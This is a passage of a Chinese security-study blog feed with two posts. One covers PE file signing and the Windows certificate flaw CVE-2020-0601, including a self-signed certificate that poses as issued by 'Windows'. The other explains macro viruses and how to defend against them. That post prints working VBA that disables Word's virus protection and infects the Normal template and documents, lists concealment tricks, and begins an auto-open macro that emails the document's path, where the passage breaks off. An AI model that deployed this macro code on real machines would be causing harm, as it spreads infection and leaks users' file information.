数字签名常用算法及应用领域</h2><p>数字签名常用算法包括：</p><ul><li>RSA数字签名算法：基于大整数分解问题，MD5、SHA</li><li>DSA数字签名算法：基于离散对数问题</li><li>ECDSA椭圆曲线数字签名算法：ECC+DSA，椭圆加密算法，属于DSA的一个变种，基于椭圆曲线上的离散对数问题</li></ul><p>其应用领域包括：</p><ul><li>PE文件数字签名</li><li>HTTPS数字签名</li><li>电子邮件数字签名</li><li>Office文档数字签名</li><li>代码数字签名</li></ul><h1 id="2-Github网站证书验证过程"><a href="#2-Github网站证书验证过程" class="headerlink" title="2. Github网站证书验证过程"></a>2. Github网站证书验证过程</h1><p>在Windows系统访问一个网站(如Github.com)时，该网站会向Windows系统发送由第三方权威机构(CA)签署的网站证书。</p><img src="/posts/8fb0b0f6/2.1.1.png" class="" title="Github网站证书验证过程"><p>Windows系统则会验证该证书是否由CA颁发，若验证通过，则Windows系统与网站成功建立TLS连接。</p><img src="/posts/8fb0b0f6/2.1.2.png" class="" title="Github网站证书验证过程"><p>为了方便下一次更快地访问，Windows将验证成功的证书放入内存中一块<code>Cetificate Cache</code>(证书缓存)中。在下一次验证时，如果该证书存在于缓存中，则直接取缓存中的值进行验证。</p><img src="/posts/8fb0b0f6/2.1.3.png" class="" title="Github网站证书验证过程"><p>微软证书漏洞(CVE-2020-0601)就是利用这一机制。在成功缓存证书数据后，根据Windows证书缓存机制，恶意网站可以伪造虚假的网站证书且通过Windows验证，将自身伪装成合法网站。</p><img src="/posts/8fb0b0f6/2.1.4.png" class="" title="Github网站证书验证过程"><p>当Windows接受到新的证书时，Windows将新接收的证书与已缓存证书的证书公钥进行遍历对比，寻找匹配的值。</p><img src="/posts/8fb0b0f6/2.1.5.png" class="" title="Github网站证书验证过程"><p>伪造的恶意证书与Windows系统中的缓存证书有同样的公钥，但Curve项没有在校验范围内，所以可以通过构造自定义Curve来伪造证书，使得证书验证流程依然成立，但通过验证的证书已经不是之前成功验证的安全证书。</p><img src="/posts/8fb0b0f6/2.1.6.png" class="" title="Github网站证书验证过程"><h1 id="3-Signtool签名PE文件"><a href="#3-Signtool签名PE文件" class="headerlink" title="3. Signtool签名PE文件"></a>3. Signtool签名PE文件</h1><p>PE文件数字签名所使用的工具包括：</p><ul><li><code>makecert.exe</code>：生成数字签名证书</li><li><code>signcode.exe</code>：数字签名工具</li><li><code>test.exe</code>：被数字签名的目标PE文件</li><li><code>test.cer</code>：数字证书文件</li><li><code>test.PVK</code>：数字签名的私钥文件</li></ul><p>假设<code>test.exe</code>是要被数字签名的PE文件，首先我们要通过<code>makecert.exe</code>生成需要的证书，生成两个文件分别是<code>test.cer</code>和<code>test.PVK</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">makecert -$ &quot;individual&quot; -r /sv &quot;test.PVK&quot; /n &quot;CN=Windows,E=microsoft,O=微软&quot; test.cer</span><br></pre></td></tr></table></figure><p>其中，通过<code>makecert.exe</code>生成需要的证书常见参数如下：</p><ul><li>-r：自签名</li><li>-n：证书名称，格式为<code>-n &quot;CN=名称,E=Email,O=组织名称,C=国家,S=省份,P=县城&quot;</code></li><li>-a：指定散列算法，其值必须是MD5(默认值)或SHA1</li><li>-$：指定证书的签名权限，其值必须是<code>commercial</code>(商业软件)或<code>individual</code>(个人软件)</li><li>-b：证书有效期的开始时间，格式为mm/dd/yyyy</li><li>-e：证书有效期的结束时间，格式为mm/dd/yyyy</li></ul><p>创建过程中需要输入私钥密码，这里设置为“v5le0n9”。</p><img src="/posts/8fb0b0f6/3.1.1.png" class="" title="输入私钥密码"><img src="/posts/8fb0b0f6/3.1.2.png" class="" title="生成两个文件"><p>查看证书信息，如果未信任则需要点击“安装证书”。</p><img src="/posts/8fb0b0f6/3.1.3.png" class="" title="安装证书"><img src="/posts/8fb0b0f6/3.1.4.png" class="" title="安装证书"><p>利用<code>signcode.exe</code>工具进行数字签名，选择需要签名的<code>test.exe</code>程序。</p><img src="/posts/8fb0b0f6/3.1.5.png" class="" title="数字签名"><p>选择自定义选项，然后选择<code>test.cer</code>文件。</p><img src="/posts/8fb0b0f6/3.1.6.png" class="" title="数字签名"><p>点击浏览按钮，添加文件<code>test.PVK</code>。哈希算法可以选MD5也可以选sha1。</p><img src="/posts/8fb0b0f6/3.1.7.png" class="" title="数字签名"><img src="/posts/8fb0b0f6/3.1.8.png" class="" title="数字签名"><p>数据描述可填可不填，时间戳服务器可填可不填，最后弹出签名成功框。</p><img src="/posts/8fb0b0f6/3.1.9.png" class="" title="签名成功"><p>此时<code>test.exe</code>文件完成数字签名，打开该EXE文件属性，可以看到签名相关信息。注意，该数字签名正常且颁发者为Windows。</p><img src="/posts/8fb0b0f6/3.1.10.png" class="" title="数字签名证书"><p>最后使用PEView软件打开PE文件，可以看到签名前和签名后的结构存在<code>CERTIFICATE Table</code>区别。</p><img src="/posts/8fb0b0f6/3.1.11.png" class="" title="数字签名证书"><h1 id="4-PE文件签名数据提取"><a href="#4-PE文件签名数据提取" class="headerlink" title="4. PE文件签名数据提取"></a>4. PE文件签名数据提取</h1><h2 id="4-1-PEView查看签名信息"><a href="#4-1-PEView查看签名信息" class="headerlink" title="4.1 PEView查看签名信息"></a>4.1 PEView查看签名信息</h2><p>使用PEView查看已经签名的<code>test.exe</code>文件，可以看到<code>Certificate Table</code>存储相关签名信息。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">WIN_CERTIFICATE</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    DWORD dwLength;<span class="comment">//WIN_CERTIFICATE长度</span></span><br><span class="line">    WORD wRevision;<span class="comment">//证书版本号</span></span><br><span class="line">    WORD wCertificateType;<span class="comment">//证书类型</span></span><br><span class="line">    BYTE bCertificate[ANYSIZE_ARRAY];<span class="comment">//SignedData开始位置</span></span><br><span class="line">&#125;WIN_CERTIFICATE, *LPWIN_CERTIFICATE;</span><br></pre></td></tr></table></figure><img src="/posts/8fb0b0f6/4.1.1.png" class="" title="签名信息"><p>文件开始位置：00000A00</p><ul><li>表项长度：4字节，头部字段和签名数据的总长度，这里为0x4A0，所以0xA00+0X4A0-1=0xE9F为签名数据结束的位置</li><li>证书版本：2字节，常见0x0200表示<code>WIN_CERT_REVISION_2</code></li><li>证书类型：2字节，常见0x0002表示包含PKCS#7的<code>SignedData</code>结构</li><li>SignedData：包含PE文件Hash值的签名数据、软件发布者公钥，选用的签名及散列算法等(在文件中为ASN.1编码)</li></ul><p>在PE文件可选文件头<code>DataDirectory</code>第5项查看文件签名信息的偏移及大小以验证上述起始地址与大小是否正确。</p><img src="/posts/8fb0b0f6/4.1.2.png" class="" title="签名信息"><h2 id="4-2-010Editor提取签名数据"><a href="#4-2-010Editor提取签名数据" class="headerlink" title="4.2 010Editor提取签名数据"></a>4.2 010Editor提取签名数据</h2><p>Ctrl + G 定位到0xA00，从第9个字节开始一直复制到0xE9F，另存为<code>test.dat</code>。</p><img src="/posts/8fb0b0f6/4.2.1.png" class="" title="提取签名数据"><img src="/posts/8fb0b0f6/4.2.2.png" class="" title="提取签名数据"><p>此时签名信息成功导出，后续需要进行数据分析。</p><h1 id="5-PE文件签名数据分析"><a href="#5-PE文件签名数据分析" class="headerlink" title="5. PE文件签名数据分析"></a>5. PE文件签名数据分析</h1><p>一个PKCS#7 <code>SignedData</code>结构包括PE文件的哈希值、一个被软件出版厂商的私钥创建的签名 和 将软件出版厂商的签名密钥和法人代表进行绑定的X.509 v3证书。PKCS#7 v1.5规范定义了如下关于<code>SignedData</code>的ASN.1(抽象语法符号)结构：</p><img src="/posts/8fb0b0f6/5.1.1.png" class="" title="ASN.1结构"><p>注意，导出的<code>test.dat</code>签名数据为ASN.1抽象结构，需要采用ASN1View或ASN1Dump进行解析，其效果如下图所示：</p><img src="/posts/8fb0b0f6/5.1.2.png" class="" title="ASN1Dump"><p>用ASN1View导出会出现错误，可能是由于DAT文件后面的5个字节为0，在校验数据大小时出现错误。</p><img src="/posts/8fb0b0f6/5.1.3.png" class="" title="ASN1View"><img src="/posts/8fb0b0f6/5.1.4.png" class="" title="最后5字节为0"><h2 id="5-1-ASN1Dump分析签名数据"><a href="#5-1-ASN1Dump分析签名数据" class="headerlink" title="5.1 ASN1Dump分析签名数据"></a>5.1 ASN1Dump分析签名数据</h2><p>调用ASN1Dump打开<code>test.dat</code>解析基础数据，每个字段都有对应的flag，比如：</p><ul><li><p>指定<code>SignedData</code>结构</p><p>值为1.2.840.113549.1.7.2，表示采用PKCS#7结构</p></li><li><p>生成签名的哈希算法</p><p>MD5：1.2.840.113549.2.5</p><p>SHA1：1.3.14.3.2.26</p><p>SHA256：2.16.840.1.101.3.4.2.1</p></li><li><p>签名属性</p><p>SPC：1.3.6.1.4.1.311.2.1.4</p></li></ul><img src="/posts/8fb0b0f6/5.1.5.png" class="" title="解析基础数据"><p>获取证书颁发者信息，包括md5withRSA签名、证书颁发者、组织、国家及省份。每块数据通常有一个标记变量，标记变量对应有相关值，比如颁发者标记2.5.4.3和颁发者“Windows”、散列算法和散列值等。</p><p>还有其它相关信息，核心数据包括：散列算法、摘要数据、公钥数据、签名后数据。</p><img src="/posts/8fb0b0f6/5.1.6.png" class="" title="其它相关信息"><p>注意，RSA签名后的数据和公钥值会还原出第一个hash值，摘要数据和散列算法将计算第二个hash值。如果两个值一致，则表示该PE文件在传输过程中违背篡改或破坏，且受信任；否则已经被破坏。</p><h2 id="5-2-ASN1View提取证书及分析数据"><a href="#5-2-ASN1View提取证书及分析数据" class="headerlink" title="5.2 ASN1View提取证书及分析数据"></a>5.2 ASN1View提取证书及分析数据</h2><p>回顾<code>test.exe</code>的签名信息和证书信息。PE文件的签名算法是SHA1，加密算法是RSA，证书的签名算法是MD5，加密算法也是RSA。</p><img src="/posts/8fb0b0f6/5.2.1.png" class="" title="PE文件签名"><img src="/posts/8fb0b0f6/5.2.2.png" class="" title="证书签名"><p>使用ASN1View打开<code>test.dat</code>。</p><p>由于ASN1View打开<code>test.dat</code>失败，暂时还无法解决，所以后面的实验暂时做不了。</p><h1 id="6-PE签名文件新增数据"><a href="#6-PE签名文件新增数据" class="headerlink" title="6. PE签名文件新增数据"></a>6. PE签名文件新增数据</h1><p>由于010Editor导入PE模板时出现错误，所以这个实验也做不了。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;在做Android逆向题时就遇到过对APK文件进行签名的题，奇安信面试官跟我说，无论是做哪个平台的逆向，它的大方向、学习路径总是相似的。比如Android逆向有签名、有Hook和注入技术，Windows逆向也是有的。所以这篇笔记就是学习PE文件的数字签名。&lt;/p&gt;</summary>
    
    
    
    <category term="Windows逆向" scheme="http://example.com/categories/Windows%E9%80%86%E5%90%91/"/>
    
    
  </entry>
  
  <entry>
    <title>宏病毒攻防机理</title>
    <link href="http://example.com/posts/772b88a4.html"/>
    <id>http://example.com/posts/772b88a4.html</id>
    <published>2022-07-02T05:54:02.122Z</published>
    <updated>2022-07-07T08:27:18.666Z</updated>
    
    <content type="html"><![CDATA[<p>宏病毒是Windows平台病毒中的一类，它是一种寄存在文档或模板的宏中的计算机病毒。一旦打开这样的文档，其中的宏就会被执行，于是宏病毒就会被激活，转移到计算机上，并驻留在Normal模板上。从此以后，所有自动保存的文档都会“感染”上这种宏病毒，而且如果其他用户打开了感染病毒的文档，宏病毒又会转移到他的计算机上。</p><span id="more"></span><h1 id="1-宏"><a href="#1-宏" class="headerlink" title="1. 宏"></a>1. 宏</h1><h2 id="1-1-基本概念"><a href="#1-1-基本概念" class="headerlink" title="1.1 基本概念"></a>1.1 基本概念</h2><p>宏是一种批量处理的称谓，是指能组织到一起作为独立的命令使用的一系列Word命令，可以实现任务执行的自动化，简化日常的工作。Microsoft Office使用Visual Basic for Applications(VBA)进行宏的编写。</p><p>注意，在Office中可以直接使用Word的宏函数，而WPS需要安装VBA for WPS后才能使用。</p><h2 id="1-2-创建宏"><a href="#1-2-创建宏" class="headerlink" title="1.2 创建宏"></a>1.2 创建宏</h2><img src="/posts/772b88a4/1.2.1.png" class="" title="创建宏"><p>代码示例如下：</p><figure class="highlight vb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Sub</span> test()</span><br><span class="line"><span class="comment">&#x27;</span></span><br><span class="line"><span class="comment">&#x27; test Macro</span></span><br><span class="line"><span class="comment">&#x27;</span></span><br><span class="line">    <span class="keyword">Dim</span> sLineNum3 <span class="keyword">As</span> <span class="type">String</span>     <span class="comment">&#x27;行号(文字)</span></span><br><span class="line">    <span class="keyword">Dim</span> nLineNum                <span class="comment">&#x27;行号(数值)</span></span><br><span class="line">    <span class="keyword">Dim</span> i <span class="keyword">As</span> <span class="type">Long</span></span><br><span class="line"> </span><br><span class="line">    Title = <span class="string">&quot;输入编号信息&quot;</span></span><br><span class="line">    a1 = <span class="string">&quot;请输入总编号开始号：&quot;</span></span><br><span class="line">    b1 = InputBox(a1, Title)</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br></pre></td></tr></table></figure><img src="/posts/772b88a4/1.2.2.png" class="" title="创建宏"><p>运行宏函数，弹出界面：</p><img src="/posts/772b88a4/1.2.3.png" class="" title="运行宏函数"><img src="/posts/772b88a4/1.2.4.png" class="" title="运行宏函数"><h2 id="1-3-录制宏"><a href="#1-3-录制宏" class="headerlink" title="1.3 录制宏"></a>1.3 录制宏</h2><p>宏的默认安全性非常高，于是会导致宏程序不会自动执行，我们可以修改降低其安全性。</p><p>假设我们现在有这样一个需求，将文档中的内容隐藏，该怎么做呢？传统方法是全选内容(Ctrl + A)，右键 -&gt; 字体(Ctrl + D)，勾选隐藏。</p><img src="/posts/772b88a4/1.2.5.png" class="" title="内容隐藏"><p>会将所选内容隐藏，包括图片。如果需要显示，则将隐藏选项取消勾选即可。</p><p>这些小技巧往往会隐藏在病毒或木马中。那么我们是否可以将这隐藏和还原两个操作用两个快捷键关联起来呢？下次再进行相关操作时，会更加方便简洁。</p><p>录制一个新宏<code>MacroHide</code>隐藏内容，快捷键为Ctrl + Shift + H。</p><img src="/posts/772b88a4/1.3.2.png" class="" title="录制新宏"><img src="/posts/772b88a4/1.3.3.png" class="" title="录制新宏"><p>同样操作，再录制一个新宏<code>MacroShow</code>还原，快捷键为Ctrl + Shift + S。</p><img src="/posts/772b88a4/1.3.1.png" class="" title="录制新宏"><p>此时，当我们按下Ctrl + Shift + H将所有内容隐藏，按下Ctrl + Shift + S所有内容显示。</p><h1 id="2-宏病毒"><a href="#2-宏病毒" class="headerlink" title="2. 宏病毒"></a>2. 宏病毒</h1><h2 id="2-1-基础知识"><a href="#2-1-基础知识" class="headerlink" title="2.1 基础知识"></a>2.1 基础知识</h2><p>宏病毒是一种寄存在文档或模板的宏中的计算机病毒，存在于数据文件或模板中(字处理文档、数据表格、数据库、演示文档等)，使用宏语言编写，利用宏语言的功能将自己寄生到其它数据文档。</p><p>最早的时候，人们认为数据文档是不可能带有病毒的，因为数据文档不包含指令，知道宏病毒出现才令大家改观。当我们打开带有宏病毒的文档，其中的宏就会被执行，宏病毒被激活，转移到计算机上，并驻留在Normal模板上。从此以后，所有自动保存的文档都会感染上这种宏病毒，而且如果其他用户打开了感染病毒的文档，宏病毒又会转移到他的计算机上。</p><p>那么，宏病毒如何获得控制权呢？只有拿到控制权之后宏病毒才能进行传播，它和Office的特性相关。Office支持一些自动执行的宏，如果将病毒代码放到自动执行的宏中，Word打开时会给病毒传播创造条件。利用自动执行宏将病毒代码写在宏汇中，由于这些宏会自动执行，从而获取控制权。</p><ol><li>Word<ul><li>AutoOpen：打开Word文档</li><li>AutoClose：关闭Word文档</li><li>AutoExec：打开Word程序</li><li>AutoExit：退出Word程序</li><li>AutoNew：新建宏</li></ul></li><li>Excel<ul><li>Auto_Open</li><li>Auto_Close</li><li>Auto_Activate</li><li>Auto_Deactivate</li></ul></li><li>Office97/2000<ul><li>Document_Open</li><li>Document_Close</li><li>Document_New</li></ul></li></ol><h2 id="2-2-自动宏案例"><a href="#2-2-自动宏案例" class="headerlink" title="2.2 自动宏案例"></a>2.2 自动宏案例</h2><p>我们通过VB编辑器增加宏代码，定义了五个自动宏。</p><figure class="highlight vb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Sub</span> AutoOpen()</span><br><span class="line">  MsgBox <span class="string">&quot;您好，您打开了Word文档！&quot;</span>, <span class="number">0</span>, <span class="string">&quot;宏病毒测试&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Sub</span> AutoExec()</span><br><span class="line">  MsgBox <span class="string">&quot;您好，您打开了Word程序！&quot;</span>, <span class="number">0</span>, <span class="string">&quot;宏病毒测试&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Sub</span> AutoNew()</span><br><span class="line">  MsgBox <span class="string">&quot;您好，您选择了新建文件！&quot;</span>, <span class="number">0</span>, <span class="string">&quot;宏病毒测试&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Sub</span> AutoExit()</span><br><span class="line">  MsgBox <span class="string">&quot;欢迎下次光临！&quot;</span>, <span class="number">0</span>, <span class="string">&quot;宏病毒测试&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Sub</span> AutoClose()</span><br><span class="line">  MsgBox <span class="string">&quot;下次还要来哦！&quot;</span>, <span class="number">0</span>, <span class="string">&quot;宏病毒测试&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Sub</span> MyFirstVBAProcedure()</span><br><span class="line">    <span class="keyword">Dim</span> NormProj</span><br><span class="line">    MsgBox <span class="string">&quot;欢迎光临V5LE0N9安全实验室！&quot;</span>, <span class="number">0</span>, <span class="string">&quot;宏病毒测试&quot;</span></span><br><span class="line">    <span class="keyword">Set</span> NormProj = NormalTemplate.VBProject</span><br><span class="line">    MsgBox NormProj.Name, <span class="number">0</span>, <span class="string">&quot;模块文件名&quot;</span>    <span class="comment">&#x27;显示模板文件的名字</span></span><br><span class="line">    <span class="keyword">With</span> Assistant.NewBalloon           <span class="comment">&#x27;调出助手</span></span><br><span class="line">        .Icon = msoIconAlert</span><br><span class="line">        .Animation = msoAnimationGetArtsy</span><br><span class="line">        .Heading = <span class="string">&quot;Attention，Please!&quot;</span></span><br><span class="line">        .<span class="keyword">Text</span> = <span class="string">&quot;Today I turn into a martian!&quot;</span></span><br><span class="line">        .Show</span><br><span class="line">    <span class="keyword">End</span> <span class="keyword">With</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br></pre></td></tr></table></figure><img src="/posts/772b88a4/2.2.1.png" class="" title="编写自动宏"><p>当关闭Word程序时，首先关闭Word文档，再关闭Word程序。</p><img src="/posts/772b88a4/2.2.2.png" class="" title="显示结果"><img src="/posts/772b88a4/2.2.3.png" class="" title="显示结果"><p>当运行<code>MyFirstVBAProcedure</code>宏时，弹出提示框后出现错误：</p><img src="/posts/772b88a4/2.2.4.png" class="" title="出现错误"><img src="/posts/772b88a4/2.2.5.png" class="" title="出现错误"><p>暂时不知道怎么解决。</p><h2 id="2-3-宏病毒感染"><a href="#2-3-宏病毒感染" class="headerlink" title="2.3 宏病毒感染"></a>2.3 宏病毒感染</h2><p>在Word和其它微软Office系列办公软件中，宏分为两种：</p><ul><li>内建宏：局部宏，位于文档中，对该文档有效，如打开文档(AutoOpen)、保存、打印、关闭等</li><li>全局宏：位于Office模板中，为所有文档所共用，如打开Word程序(AutoExec)</li></ul><p>宏病毒的传播路线如下：</p><ul><li>单机：单个Office文档 -&gt; Office文档模板 -&gt; 多个Office文档(文档到模块感染)</li><li>网络：电子邮件居多</li></ul><p>宏病毒感染流程：首先Office文档被感染病毒，当文档打开会执行自动宏，如果宏被执行，它会去检测当前模板是否被感染病毒。如果没有被感染，它将释放自身的病毒代码。当模板被感染之后，系统中任何一个文档被打开，都会执行模板中的病毒，宏病毒进行传播。</p><p>宏病毒的感染方案就是让宏在数据文档和文档模板之间互相感染。</p><img src="/posts/772b88a4/2.3.1.png" class="" title="宏病毒的感染方案"><p>完整代码如下：</p><figure class="highlight vb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Sub</span> test()</span><br><span class="line">    <span class="comment">&#x27;On Error Resume Next</span></span><br><span class="line">    Application.DisplayAlerts = wdAlertsNone</span><br><span class="line">    Application.EnableCancelKey = wdCancelDisabled</span><br><span class="line">    Application.DisplayStatusBar = <span class="literal">False</span></span><br><span class="line">    Options.VirusProtection = <span class="literal">False</span></span><br><span class="line">    Options.SaveNormalPrompt = <span class="literal">False</span>        <span class="comment">&#x27;以上是病毒基本的自我保护措施</span></span><br><span class="line">    <span class="keyword">Set</span> Doc = ActiveDocument.VBProject.VBComponents</span><br><span class="line">    <span class="comment">&#x27;取当前活动文档中工程组件集合</span></span><br><span class="line">    <span class="keyword">Set</span> Tmp = NormalTemplate.VBProject.VBComponents</span><br><span class="line">    <span class="comment">&#x27;取Word默认模板中工程组件集合</span></span><br><span class="line">    <span class="keyword">Const</span> ExportSource = <span class="string">&quot;c:\jackie.sys&quot;</span></span><br><span class="line">    <span class="keyword">Const</span> VirusName = <span class="string">&quot;AIGTMV1&quot;</span>               <span class="comment">&#x27;该字符串相当于一个病毒感染标志</span></span><br><span class="line">    Application.VBE.ActiveVBProject.VBComponents(VirusName).Export ExportSource</span><br><span class="line">                                 <span class="comment">&#x27;将当前病毒代码导出到c:\jackie.sys文件保存</span></span><br><span class="line">                                 </span><br><span class="line">    <span class="keyword">For</span> i = <span class="number">1</span> <span class="keyword">To</span> Tmp.Count</span><br><span class="line">        <span class="keyword">If</span> Tmp(i).Name = VirusName <span class="keyword">Then</span> TmpInstalled = <span class="number">1</span></span><br><span class="line">     <span class="comment">&#x27;检查模板是否已经被感染病毒</span></span><br><span class="line">    <span class="keyword">Next</span> i</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">For</span> j = <span class="number">1</span> <span class="keyword">To</span> Doc.Count</span><br><span class="line">        <span class="keyword">If</span> Doc(j).Name = VirusName <span class="keyword">Then</span> DocInstalled = <span class="number">1</span></span><br><span class="line">                                     <span class="comment">&#x27;检查当前活动文档是否已被感染病毒</span></span><br><span class="line">    <span class="keyword">Next</span> j</span><br><span class="line">    <span class="keyword">If</span> TmpInstalled = <span class="number">0</span> <span class="keyword">Then</span>                 <span class="comment">&#x27;如果模板没有被感染，对其进行感染</span></span><br><span class="line">        Tmp.Import ExportSource              <span class="comment">&#x27;从c:\jackie.sys将病毒导入模板</span></span><br><span class="line">        NormalTemplate.Save                  <span class="comment">&#x27;自动保存模板，以免引起用户怀疑</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">    <span class="keyword">If</span> DocInstalled = <span class="number">0</span> <span class="keyword">Then</span>                 <span class="comment">&#x27;如果当前活动文档没有被感染</span></span><br><span class="line">        Doc.Import ExportSource              <span class="comment">&#x27;从c:\jackie.sys将病毒导入当前活动文档</span></span><br><span class="line">        ActiveDocument.SaveAs ActiveDocument.FullName <span class="comment">&#x27;自动保存当前活动文档</span></span><br><span class="line">    <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">    MsgBox <span class="string">&quot;Word instructional macro by jackie&quot;</span>, <span class="number">0</span>, <span class="string">&quot;Word.APMP&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br></pre></td></tr></table></figure><p>宏病毒也可以通过网络进行传播，例如电子邮件。</p><ul><li>Mellisa病毒：自动往OutLook邮件用户地址簿中的前50位用户发送病毒副本</li><li>“叛逃者”病毒：集成了感染Office文档的宏病毒感染功能，并且可以通过OutLook发送病毒副本</li></ul><img src="/posts/772b88a4/2.3.2.png" class="" title="通过电子邮件传播"><h1 id="3-宏病毒的自我保护与防御"><a href="#3-宏病毒的自我保护与防御" class="headerlink" title="3. 宏病毒的自我保护与防御"></a>3. 宏病毒的自我保护与防御</h1><p>宏病毒的自我保护主要包括三种方法：</p><ol><li><p>禁止提示信息</p><p>On Error Resume Next 如果发生错误，不弹出出错窗口，继续往下执行语句</p><p>Application.DisplayAlerts = wdAlertsNone 不弹出警告窗口</p><p>Application.DisplayStatusBar = False 不显示状态栏，以免显示宏的运行状态</p><p>Options.VirusProtection = False 关闭病毒保护功能，运行前如果包含宏，不提示</p><p>…</p></li><li><p>屏蔽命令菜单，不允许查看宏</p><ul><li><p>通过特定宏定义</p><figure class="highlight vb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Sub</span> ViewVBCode()</span><br><span class="line">    MsgBox <span class="string">&quot;Unexcpected error&quot;</span>,<span class="number">16</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br></pre></td></tr></table></figure><p><code>ViewCode</code>过程和<code>ViewVBCode</code>函数一样，如果用户按工具栏上的小图标就会执行这个过程。</p></li><li><p>Disable或删除特定菜单项</p><p>用来使“视图 -&gt; 宏”菜单失效的语句</p><figure class="highlight vb"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CommandBars(<span class="string">&quot;Tools&quot;</span>).Controls(<span class="number">16</span>).Enabled = <span class="literal">False</span></span><br></pre></td></tr></table></figure></li></ul></li><li><p>隐藏宏的真实病毒代码</p><p>在自动宏中，不包括任何感染或破坏的代码，但包含了创建、执行和删除新宏(实际进行感染和破坏的宏)的代码，将宏代码字体颜色设置成与背景一样的白色等</p></li></ol><p>宏病毒的防御措施包括：</p><ul><li>一旦发现计算机Office软件打开后弹出系统警告框，并且无法“另存为”，就表示该文件已感染宏病毒，此时不能再打开其它文件，否则其它文件也会被感染，应马上关闭删除该文件。若文件重要不能删除，则需用杀毒软件全盘扫描，处理感染文件。</li><li>开启禁用宏进行防止再次感染病毒。在“受信任位置”中，删除“可靠来源”列表框中的不安全来源，根据实际情况设置是否信任所有安装的加载项和模板，设置宏的安全性。</li><li>安装杀毒软件，打全系统补丁是预防计算机病毒的基本措施，当然也适用于宏病毒。除此之外，宏病毒还有专门的防治措施。</li><li>在线沙箱检测文档是否包含宏病毒。</li></ul><h1 id="4-案例：CDO自发邮箱"><a href="#4-案例：CDO自发邮箱" class="headerlink" title="4. 案例：CDO自发邮箱"></a>4. 案例：CDO自发邮箱</h1><p>接下来我们制作一个宏，当对方打开文档时就知道该文档在对方电脑存储的具体路径。常见方法包括：</p><ul><li>邮件组件，如CDO组件</li><li>远程脚本</li></ul><p>这里采用CDO自发邮件实现。通过Word VB编写脚本，设置文档打开时运行，利用CDO发送电子邮件将文件的路径和名字发送到指定邮箱中。具体步骤如下：</p><ol><li>利用<code>AutoOpen</code>执行并打开文档时运行</li><li>利用<code>WordObj.ActiveDocument</code>获取文件信息</li><li>利用CDO实现电子邮件信息传递</li></ol><p>注意，千万别小瞧这个功能，如果是一封钓鱼邮件或运行宏病毒自动采集个人电脑信息发送至指定邮箱，其危害性非常大，而且该攻击手段广泛存在于许多亚洲攻击组织中。</p><p>新建宏函数<code>AutoOpen</code>，核心代码如下：</p><figure class="highlight vb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 